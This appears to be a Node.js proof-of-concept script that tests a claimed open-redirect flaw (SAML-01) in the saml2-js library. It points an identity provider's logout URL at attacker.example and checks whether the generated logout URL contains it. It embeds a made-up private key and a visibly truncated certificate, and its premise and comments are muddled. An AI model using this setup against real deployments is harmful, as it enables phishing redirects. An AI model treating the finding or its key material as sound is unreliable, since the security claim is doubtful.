// saml2-js — SAML-01: open redirect via IdP-controlled SSO URL.
// create_logout_request_url / create_logout_response_url are passed
// to a service-provider instance. The `sso_logout_url` is used as
// the redirect target without validation.
const saml2 = require("saml2-js");

console.log("saml2-js PoC — version:", require("saml2-js/package.json").version);

const sp = new saml2.ServiceProvider({
  entity_id: "https://victim.example/sp",
  private_key: "-----BEGIN RSA PRIVATE KEY-----\nMIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\nKUpRKfFLfRYC9AIKjbJTWit+CqvjWYzvQwECAwEAAQJAIJLixBy2qpFoS4DSmoEm\no3qGy0t6z09AIJtH+5OeRV1be+N4cDYJKffGzDa88vQENZiRm0GRq6a+HPGQMd2k\nTQIhAKMSvzIBnni7ot/OSie2TmJLY4SwTQAevXysE2RbFDYdAiEBCUEaRQnMnbp7\n9mxDXDf6AU0cN/RPBjb9qSHDcWZHGzUCIG2Es59z8ugGrDY+pxLQnwfotadxd+Uy\nv/Ow5T0q5gIJAiEAyS4RaI9YG8EWx/2w0T67ZUVAw8eOMB6BIUg0Xcu+3okCIBOs\n/5OiPgoTdSy7bcF9IGpSE8ZgGKzgYQVZeN97YE00\n-----END RSA PRIVATE KEY-----",
  certificate: "-----BEGIN CERTIFICATE-----\nMIIBdjCCAR2gAwIBAgIUZ4UqE9CMGmY5gZ5Y4Z2M0Y3o8WowDQYJKoZIhvcNAQEL\nBQAwETEPMA0GA1UEAwwGSWRQSW5QMB4XDTI1MDEwMTAwMDAwMFoXDTI2MDEwMTAw\nMDAwMFowETEPMA0GA1UEAwwGSWRQSW5QMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJB\nAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8QuKUpRKfFLfRYC\n9AIKjbJTWit+CqvjWYzvQwECAwEAAaNTMFEwHQYDVR0OBBYEFII7Q4z8n5z5q7p4\njLNy6nAfnvLpMB8GA1UdIwQYMBaAFII7Q4z8n5z5q7p4jLNy6nAfnvLpMA8GA1Ud\nEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAB\n-----END CERTIFICATE-----",
  assert_endpoint: "https://victim.example/assert",
  audience: "https://victim.example/sp",
});

const idp_options = {
  sso_logout_url: "https://attacker.example/phish",   // attacker-controlled IdP
  sso_login_url:  "https://attacker.example/login",
  certificates:   ["-----BEGIN CERTIFICATE-----\nMIIBdjCCAR2gAwIBAgIUZ4UqE9CMGmY5gZ5Y4Z2M0Y3o8WowDQYJKoZIhvcNAQEL\nBQAwETEPMA0GA1UEAwwGSWRQSW5QMB4XDTI1MDEwMTAwMDAwMFoXDTI2MDEwMTAw\nMDAwMFowETEPMA0GA1UEAwwGSWRQSW5QMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJB\n-----END CERTIFICATE-----"],
  sign_get_request: false,
  allow_unencrypted_assertion: true,
  allow_missing_inresponse_to: true,
};
const idp = new saml2.IdentityProvider(idp_options);

// Trigger create_logout_request_url and observe where it points.
// Signature: sp.create_logout_request_url(identity_provider, options, callback)
sp.create_logout_request_url(idp, {}, (err, logout_url) => {
  if (err) { console.log("  err:", err); process.exit(1); }
  console.log("\n  generated logout URL:");
  console.log("  ", logout_url);

  // The saml2-js code embeds idp.sso_logout_url into the generated
  // URL's RelayState (or the destination) without validating it.
  // For demonstration, the URL here is a SAMLRequest -> IdP flow.
  // The "open redirect" is when the user clicks logout, they go
  // straight to the attacker's sso_logout_url, which is unvalidated.
  if (logout_url.includes("attacker.example")) {
    console.log("\n  >>> SAML-01 CONFIRMED: attacker-controlled IdP URL was used as redirect target <<<");
    process.exit(0);
  } else {
    console.log("\n  >>> could not reproduce: did not see attacker URL <<<");
    process.exit(1);
  }
});
